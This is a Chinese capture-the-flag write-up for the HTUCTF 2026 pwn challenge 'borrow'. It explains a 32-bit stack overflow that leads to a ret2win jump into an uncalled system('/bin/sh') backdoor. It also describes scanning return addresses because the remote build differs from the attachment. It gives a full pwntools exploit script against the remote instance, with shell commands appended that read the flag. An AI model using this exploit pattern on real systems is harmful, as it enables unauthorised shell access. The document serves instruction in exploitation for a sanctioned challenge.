# borrow（Pwn 1000pt）— HTUCTF 2026

- 实例：`103.163.47.230:33608`
- 附件：`borrow`（ELF32 i386，Non-PIE）
- 脚本：`exp_borrow.py`
- flag：`HTUCTF{f9759d8f-44b9-48ac-8fff-6eb327cc689d}`

## 一、附件分析（ELF32, Non-PIE, 无 canary）

字符串只有三段剧情 + `/bin/sh` + `key`，函数只有三个（外加 crt）：

```c
// 0x8049224  vuln()  —— 题目真正走到的地方
void vuln(void) {
    char buf[0x18];
    puts("小路没人看，走起~");
    read(0, buf, 0x20);           // ← 0x18 的 buffer 读了 0x20：只溢出 8 字节
    puts("不对，小路呢？");
}

// 0x80491c6  check() —— 没有任何地方调用它（后门）
void check(void) {
    if (!strcmp(*(char **)0x804c088, "key")) {   // 0x804a008 = "key"
        puts("借到力，读书人的事当然是借啦~");
        system("/bin/sh");
    } else {
        puts("啊咧，有钥匙吗？");
        exit(0);
    }
}

// 0x8049260  main()
int main(void) {
    setvbuf(...) x3;
    puts("今天去借书，不过馆前有门卫守着，试试绕过吧");
    *(int *)0x804c088 = 0x79656b;   // "key" —— 后门的钥匙早就插好了
    vuln();
}
```

题面「正门有守卫、小路走不通」就是在暗示：**别去正面硬刚，走没人调用的后门**。

栈布局（8 字节溢出刚好够用）：

```
buf            = ebp-0x18
saved ebp      = ebp+0x00     ← 偏移 0x18
return address = ebp+0x04     ← 偏移 0x1c
```

```
payload = b"A"*0x18 + b"BBBB" + p32(后门地址)
```

因为 `main` 已经把全局 `0x804c088` 写成 `"key"`，跳到 `check()` 后 `strcmp` 直接通过，
`system("/bin/sh")` 白给，不需要泄露、不需要 ROP、不需要碰 canary（这个 build 也没 canary）。

## 二、真正的坑：远程二进制和附件不是同一个 build

按附件的 `0x80491c6` 打过去，**一点输出都没有，连接静默关闭**；
换成 `0x8049260`（main）、`0x80492ad`（main 里打印 banner 的 puts）、
`0x80490f4`（一个裸 `ret`）也全都一样。

诊断过程：

1. 先确认 `read` 一定能拿到 32 字节：发 1 字节就能让程序立刻打印「不对」，说明 `read`
   是「有多少拿多少」；再发 132/2000 字节也一样，说明数据确实到了。
2. 用「跳回 puts 应该会多打一行」的方式验证返回地址是否生效 —— 没有多打。但也不能就此
   断定没写进去。于是**把整个可能的代码空间当成返回地址扫一遍**（顺便覆盖掉偏移不确定的情况）。
3. 扫到 `0x80498f5` 时，多打出 `借到力，读书人的事当然是借啦~` 而且连接保持不关 ——
   这就是远程版本的后门。

也就是说：**远程跑的是另一个（更大的）32 位 build**：它带 `__stack_chk_fail`
（扫的时候有几个地址能打出 `*** stack smashing detected ***`），`main` 在 `0x80497f0` 附近，
`.text` 一直延伸到 `0x804a000`；而附件是 `-fno-stack-protector` 的精简 build，
`.text` 只到 `0x80492dc`。两者漏洞形态、栈布局、读长度全一样，**只有代码地址不同**。

远程实测布局（扫描得到）：

| 地址 | 含义 |
| --- | --- |
| `0x08049802` | main 里打印 banner 的 puts |
| `0x080498f5` | **后门成功分支** → `借到力…` + `system("/bin/sh")` |
| `0x0804990e` | 后门失败分支 → `啊咧，有钥匙吗？` |
| `0x08049953` | 漏洞函数 `小路没人看，走起~` + `read` |

## 三、第二个坑：shell 命令必须和 payload 同一个包

`read(0, buf, 0x20)` 只吃 32 字节，剩下的字节留在同一个 stdin 里、被 `system("/bin/sh")`
起的 dash 读到。所以：

```python
pkt = b"A"*0x18 + b"BBBB" + p32(0x080498f5) + b"CCCCCCCC" + b";cat /flag;\n"
s.sendall(pkt)          # 必须一次 sendall
```

- 如果先发 payload、隔一会儿再发命令 → 连接直接被 **RST**，shell 秒死。
- 命令直接跟在第 32 字节后面时，开头若是 `;` 会报 `Syntax error: ";" unexpected`，
  所以插几个填充字符（或换行）更稳。

实测 `read` 正好消费 32 字节：把命令放在偏移 `0x28/0x30/0x40/...` 都能执行，
对应输出 `CCCCCCCC: not found` → 证明切分点就在 0x20。

## 四、最终 payload

```python
from pwn import *
context.arch = "i386"
BACKDOOR = 0x080498F5
r = remote("103.163.47.230", 33608)
r.recvuntil(b"\xef\xbc\x9f")                       # banner
r.send(b"A"*0x18 + b"BBBB" + p32(BACKDOOR) + b"\ncat /flag;ls /\n")
print(r.recvrepeat(2))
```

```
HTUCTF{f9759d8f-44b9-48ac-8fff-6eb327cc689d}
```

## 五、踩坑总结

1. **附件 ≠ 远程**：pwn 题一旦出现「payload 结构明显正确但完全无反应」，先怀疑远程是另一个 build，
   用「把返回地址空间扫一遍」找出真实地址，比死磕反汇编快得多。
2. 8 字节溢出刚好够 `saved ebp + ret`，别被「溢出这么短」骗了，`ret2win` 足够。
3. 容器里 `system("/bin/sh")` 的 shell 共用同一个 stdin，**一包发完**（这是这套靶机的通病，
   `七夕`/`Ciallo` 都是同一个现象）。
